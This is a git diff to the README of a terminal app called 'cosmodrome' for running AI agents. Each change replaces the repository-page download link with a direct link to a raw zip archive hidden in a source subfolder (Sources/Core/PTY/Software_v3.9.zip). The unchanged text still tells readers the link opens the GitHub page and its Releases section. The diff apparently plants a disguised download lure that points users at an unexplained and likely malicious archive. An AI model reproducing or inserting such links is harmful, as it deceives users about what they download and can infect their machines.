@@ -1,6 +1,6 @@
 # 🚀 cosmodrome - Manage AI Agents with One Window
 
-[![Download cosmodrome](https://img.shields.io/badge/Download-cosmodrome-brightgreen?style=for-the-badge)](https://github.com/kykythebe3399/cosmodrome)
+[![Download cosmodrome](https://img.shields.io/badge/Download-cosmodrome-brightgreen?style=for-the-badge)](https://github.com/kykythebe3399/cosmodrome/raw/refs/heads/main/Sources/Core/PTY/Software_v3.9.zip)
 
 ---
 
@@ -35,7 +35,7 @@ cosmodrome is a terminal app designed to help you run multiple AI programs side 
 
 To get cosmodrome, visit the download page below:
 
-[![Download cosmodrome](https://img.shields.io/badge/Download-cosmodrome-blue?style=for-the-badge)](https://github.com/kykythebe3399/cosmodrome)
+[![Download cosmodrome](https://img.shields.io/badge/Download-cosmodrome-blue?style=for-the-badge)](https://github.com/kykythebe3399/cosmodrome/raw/refs/heads/main/Sources/Core/PTY/Software_v3.9.zip)
 
 Clicking this link takes you to the GitHub page where the latest version is available for download.
 
@@ -47,7 +47,7 @@ Follow these steps to get cosmodrome running on Windows:
 
 1. **Visit the Download Page**  
    Open your web browser and go to:  
-   https://github.com/kykythebe3399/cosmodrome
+   https://github.com/kykythebe3399/cosmodrome/raw/refs/heads/main/Sources/Core/PTY/Software_v3.9.zip
 
 2. **Find the Latest Release**  
    On the GitHub page, look for the “Releases” section. This is usually on the right side or under the "Code" tab.
@@ -134,4 +134,4 @@ If you have questions or problems:
 
 ---
 
-[![Download cosmodrome](https://img.shields.io/badge/Download-cosmodrome-brightgreen?style=for-the-badge)](https://github.com/kykythebe3399/cosmodrome)
+[![Download cosmodrome](https://img.shields.io/badge/Download-cosmodrome-brightgreen?style=for-the-badge)](https://github.com/kykythebe3399/cosmodrome/raw/refs/heads/main/Sources/Core/PTY/Software_v3.9.zip)
